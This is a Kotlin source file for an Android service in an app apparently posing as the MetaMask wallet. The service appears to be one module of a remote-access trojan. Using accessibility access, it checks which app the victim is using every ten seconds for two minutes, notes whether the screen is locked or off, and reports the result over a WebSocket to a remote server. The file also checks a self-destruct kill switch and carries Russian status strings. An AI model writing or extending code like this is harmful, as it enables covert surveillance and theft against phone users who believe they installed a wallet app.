package com.example.MetaMask.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import androidx.annotation.Keep
import org.json.JSONObject

@Keep
class ForegroundAppMonitorService : Service() {

    companion object {
        private const val TAG = "ForegroundAppMonitor"
        const val ACTION_START_MONITORING = "com.example.MetaMask.ACTION_START_FG_APP_MONITORING"
        private const val MONITORING_DURATION_SECONDS = 120
        private const val CHECK_INTERVAL_MS = 10_000L
    }

    private val handler = Handler(Looper.getMainLooper())
    private var remainingSeconds = MONITORING_DURATION_SECONDS
    private var stopped = false

    private val checkRunnable = object : Runnable {
        override fun run() {
            android.util.Log.d("XDBG", "[ForegroundAppMonitorService] run enter") //xdbg
            if (stopped) return
            sendCurrentApp()
            remainingSeconds -= CHECK_INTERVAL_MS.toInt() / 1000
            if (remainingSeconds > 0) {
                android.util.Log.d("XDBG", "[ForegroundAppMonitorService] if branch") //xdbg
                handler.postDelayed(this, CHECK_INTERVAL_MS)
            } else {
                stopSelf()
            }
        }
    }

    override fun onCreate() {
        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] onCreate enter") //xdbg
        super.onCreate()
        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[ForegroundAppMonitorService] if branch") //xdbg
            stopSelf()
            return
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        if (intent?.action == ACTION_START_MONITORING) {
            android.util.Log.d("XDBG", "[ForegroundAppMonitorService] if branch") //xdbg
            stopped = false
            remainingSeconds = MONITORING_DURATION_SECONDS
            handler.removeCallbacks(checkRunnable)
            handler.post(checkRunnable)
            android.util.Log.d("XDBG", "[ForegroundAppMonitorService] return") //xdbg
            return START_STICKY
        }
        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] return") //xdbg
        return START_NOT_STICKY
    }

    private fun getForegroundAppName(): String {
        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] getForegroundAppName enter") //xdbg
        val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
        if (powerManager?.isInteractive == false) return "Экран выключен"

        val pkg = try {
            val root = AccessSvc.instance?.rootInActiveWindow
            val pkgName = root?.packageName?.toString()
            try { root?.recycle() } catch (_: Exception) {}
            pkgName
        } catch (_: Exception) { null }

        if (pkg.isNullOrEmpty()) return "Нет активного окна"

        if (pkg == "com.android.systemui") return "Экран заблокирован"

        try {
            val homeIntent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
            val launcherPkg = packageManager.resolveActivity(homeIntent, 0)?.activityInfo?.packageName
            if (!launcherPkg.isNullOrEmpty() && pkg == launcherPkg) return "Рабочий стол"
        } catch (_: Exception) {}

        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] return") //xdbg
        return try {
            val ai = packageManager.getApplicationInfo(pkg, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (_: Exception) { pkg }
    }

    private fun sendCurrentApp() {
        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] sendCurrentApp enter") //xdbg
        try {
            val payload = JSONObject().apply {
                put("action", "foregroundAppUpdate")
                put("appName", getForegroundAppName())
                put("remainingTime", remainingSeconds)
            }
            val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                `package` = applicationContext.packageName
            }
            sendBroadcast(intent)
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[ForegroundAppMonitorService] onDestroy enter") //xdbg
        super.onDestroy()
        stopped = true
        handler.removeCallbacks(checkRunnable)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
